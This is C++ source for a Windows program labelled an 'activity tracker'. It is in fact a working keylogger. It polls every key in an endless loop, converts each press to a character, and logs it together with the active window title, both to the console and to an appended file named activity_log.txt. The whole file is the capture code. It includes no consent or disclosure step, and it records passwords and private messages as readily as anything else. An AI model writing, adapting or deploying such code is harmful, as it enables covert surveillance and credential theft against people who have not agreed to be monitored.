#include <iostream>
#include <fstream>
#include <windows.h>
#include <psapi.h>

// Function to get the active window title
std::string GetActiveWindowTitle() {
    char windowTitle[256];
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow) {
        GetWindowTextA(foregroundWindow, windowTitle, 256);
        return std::string(windowTitle);
    }
    return "Unknown";
}


wchar_t GetCharFromKey(int key) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    // Map virtual key to scan code
    UINT scanCode = MapVirtualKey(key, MAPVK_VK_TO_VSC);

    // Convert to Unicode character
    wchar_t buffer[2];
    if (ToUnicode(key, scanCode, keyboardState, buffer, 2, 0) == 1) {
        return buffer[0];
    }
    return L'\0'; // Return null character if no valid conversion
}


// Function to log keystrokes
void LogKeystrokes() {
    std::ofstream logFile("activity_log.txt", std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        return;
    }

    while (true) {
        Sleep(10); // Reduce CPU usage
        for (int key = 8; key <= 255; key++) { // Check for key presses
            if (GetAsyncKeyState(key) & 0x0001) { // Key is pressed
                char pressedChar = GetCharFromKey(key);
                if (pressedChar != '\0') {
                    std::cout << "Key: " << pressedChar << " | Window: " << GetActiveWindowTitle() << std::endl;
                    logFile << "Key: " << pressedChar << " | Window: " << GetActiveWindowTitle() << std::endl;
                } else {
                    std::cout << "Special Key: " << key << " | Window: " << GetActiveWindowTitle() << std::endl;
                    logFile << "Special Key: " << key << " | Window: " << GetActiveWindowTitle() << std::endl;
                }
            }
        }
    }
}

int main() {
    std::cout << "Starting activity tracker..." << std::endl;

    LogKeystrokes();
    return 0;
}